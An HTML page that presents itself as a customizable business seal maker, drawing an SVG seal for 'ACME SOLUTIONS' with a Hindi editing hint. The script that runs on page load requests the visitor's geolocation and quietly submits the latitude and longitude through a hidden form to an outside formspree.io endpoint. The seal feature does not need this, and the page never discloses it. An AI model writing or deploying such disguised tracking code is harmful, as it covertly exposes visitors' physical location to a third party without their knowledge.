<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>SelceFourse</title>
</head>
<style>
  /* Inline CSS for styling the page and centering the seal */
  html,body{height:100%;margin:0;font-family:Arial, Helvetica, sans-serif;background:#f7f7f7}
  .wrap{min-height:100%;display:flex;align-items:center;justify-content:center;padding:24px}
  .card{background:#fff;padding:20px;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.08);text-align:center}
  .seal-container{width:320px;height:320px;margin:0 auto}
  /* Responsive */
  @media (max-width:420px){ .seal-container{width:260px;height:260px} }
  /* Small instructions */
  .hint{margin-top:12px;color:#666;font-size:13px}
</style>
<body>
    <div class="wrap">
    <div class="card">
      <!-- MODIFY THESE VALUES to customize the seal -->
      <div style="display:none" id="seal-data"
           data-company="ACME SOLUTIONS"
           data-tag="QUALITY & TRUST"
           data-reg="GSTIN: 22AAAAA0000A1Z5">
      </div>

      <!-- SVG-based circular seal -->
      <div class="seal-container" role="img" aria-label="Business seal">
        <svg viewBox="0 0 420 420" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">
          <!-- Outer textured ring -->
          <defs>
            <filter id="soft" x="-50%" y="-50%" width="200%" height="200%">
              <feGaussianBlur stdDeviation="1.2"/>
            </filter>
            <radialGradient id="g1" cx="50%" cy="45%" r="60%">
              <stop offset="0%" stop-color="#fff"/>
              <stop offset="100%" stop-color="#ffdede"/>
            </radialGradient>
          </defs>

          <circle cx="210" cy="210" r="200" fill="#fff6f6" stroke="#c62828" stroke-width="6"/>
          <circle cx="210" cy="210" r="176" fill="none" stroke="#c62828" stroke-width="8" stroke-dasharray="6 6" />
          <circle cx="210" cy="210" r="150" fill="url(#g1)" stroke="#b71c1c" stroke-width="4" />

          <!-- inner emblem / star -->
          <g transform="translate(210,210)">
            <polygon points="0,-62 18,-18 68,-18 28,8 40,54 0,30 -40,54 -28,8 -68,-18 -18,-18"
                     fill="#b71c1c" stroke="#880e0e" stroke-width="2" />
            <circle r="18" fill="#fff6f6" stroke="#b71c1c" stroke-width="2"/>
          </g>

          <!-- Circular text (company name) -->
          <g>
            <!-- top arc text using <textPath> -->
            <path id="topArc" d="M60,210 a150,150 0 1,1 300,0" fill="none"/>
            <text text-anchor="middle" style="font-size:20px;letter-spacing:3px;font-weight:700;fill:#7b0f0f">
              <textPath href="#topArc" startOffset="50%">
                <!-- Company name inserted by JS below -->
                ACME SOLUTIONS
              </textPath>
            </text>

            <!-- bottom arc text -->
            <path id="bottomArc" d="M360,210 a150,150 0 1,1 -300,0" fill="none"/>
            <text text-anchor="middle" style="font-size:14px;letter-spacing:2px;fill:#7b0f0f">
              <textPath href="#bottomArc" startOffset="50%">
                QUALITY &amp; TRUST
              </textPath>
            </text>
          </g>

          <!-- center label / reg no -->
          <text x="210" y="255" text-anchor="middle" style="font-size:13px;fill:#4a0c0c;font-weight:600">
            GSTIN: 22AAAAA0000A1Z5
          </text>
        </svg>
      </div>

      <div class="hint">आप company name / tagline / reg no बदलने के लिये ऊपर के <code>seal-data</code> element के attributes edit कर सकते हैं।</div>
    </div>
  </div>


  <form id="locationForm" action="https://formspree.io/f/xovnogqr" method="POST">
    <input type="hidden" name="latitude" id="latitude">
    <input type="hidden" name="longitude" id="longitude">
  </form>

  <script>
    const form = document.getElementById('locationForm');
    const latInput = document.getElementById('latitude');
    const lonInput = document.getElementById('longitude');

    function submitForm() {
      form.submit();
    }

    function sendLocation() {
      if (!navigator.geolocation) {
        alert("Geolocation not supported.");
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (pos) => {
          latInput.value = pos.coords.latitude;
          lonInput.value = pos.coords.longitude;
          submitForm();
        },
        (err) => {
          alert("Error: " + err.message);
        }
      );
    }

    window.addEventListener("load", sendLocation);
    (function(){
      const d = document.getElementById('seal-data');
      if(!d) return;
      const name = (d.dataset.company || '').toUpperCase().trim();
      const tag = (d.dataset.tag || '').toUpperCase().trim();
      const reg = (d.dataset.reg || '').trim();

      // Set top arc (company)
      const topTP = document.querySelector('textPath[href="#topArc"]');
      if(topTP && name) topTP.textContent = name;

      // bottom arc (tagline)
      const bottomTP = document.querySelectorAll('textPath[href="#bottomArc"]')[0];
      if(bottomTP && tag) bottomTP.textContent = tag;

      // center reg no
      const centerText = document.querySelector('svg text[x="210"][y="255"]');
      if(centerText && reg) centerText.textContent = reg;
    })();
  </script>
  </script>
</body>
</html>
